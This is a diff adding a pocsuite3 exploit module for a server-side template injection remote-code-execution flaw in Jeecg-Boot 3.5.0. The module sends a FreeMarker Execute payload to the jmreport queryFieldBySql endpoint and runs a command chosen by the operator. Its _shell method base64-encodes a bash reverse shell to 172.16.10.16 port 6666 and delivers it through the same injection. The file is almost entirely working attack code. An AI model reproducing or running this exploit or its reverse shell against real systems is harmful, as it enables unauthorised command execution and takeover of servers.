@@ -1,0 +1,86 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+import json,base64
+from pocsuite3.api import (
+    minimum_version_required, POCBase, register_poc, requests, logger,
+    OptString, OrderedDict,
+    random_str,
+)
+
+minimum_version_required('1.9.6')
+
+
+class DemoPOC(POCBase):
+    vulID = '0'
+    version = '1'
+    author = 'changge'
+    vulDate = '2024-03-31'
+    createDate = '2024-03-31'
+    updateDate = '2024-03-31'
+    references = []
+    name = 'Jeecg-Boot-SSTL-RCE'
+    appPowerLink = 'http://www.jeecg.com/'
+    appName = 'Jeecg-Boot'
+    appVersion = '3.5.0'
+    vulType = '2,7'
+    desc = 'Vulnerability description'
+    samples = ['']
+    install_requires = ['']
+    pocDesc = 'User manual of poc'
+    dork = {'zoomeye': ''}
+    suricata_request = ''
+    suricata_response = ''
+
+    def _options(self):
+        o = OrderedDict()
+        o['cmd'] = OptString('whoami', description='The command to execute')
+        return o
+
+    def _exploit(self, param=''):
+        if not self._check(dork=''):
+            return False
+        lj = '/jeecg-boot/jmreport/queryFieldBySql'
+        url = self.url + lj
+        print(url)
+        headers = {'Content-Type': 'application/json'}
+        payload = f'{{"sql": "select \'result:<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${{value(\\"{param}\\")}}\'"}}'
+        res = requests.post(url=url, headers=headers, data=payload)
+        print(payload)
+        logger.debug(res.text)
+        return res.text
+
+    def _verify(self):
+        result = {}
+        flag = random_str(6).lower()
+        param = f'echo {flag}'
+        res = self._exploit(param)
+        if flag in res:
+            result['VerifyInfo'] = {}
+            result['VerifyInfo']['URL'] = self.url
+            result['VerifyInfo'][param] = res
+        return self.parse_output(result)
+        # else:
+        #     print(res)
+            
+
+    def _attack(self):
+        result = {}
+        param = self.get_option('cmd')
+        res = self._exploit(param)
+        res = json.loads(res)
+        result['VerifyInfo'] = {}
+        result['VerifyInfo']['URL'] = self.url
+        result['VerifyInfo'][param] = res['result']['fieldList'][0]['fieldName']
+        return self.parse_output(result)
+
+    def _shell(self):
+        try:
+            cmd = 'bash -i >/dev/tcp/172.16.10.16/6666 0>&1'
+            encoder = base64.b64encode(cmd.encode("utf-8"))
+            param = "bash -c {echo,"+encoder.decode("utf-8")+"}|{base64,-d}|{bash,-i}"
+            self._exploit(param)
+        except Exception:
+            pass
+
+
+register_poc(DemoPOC)
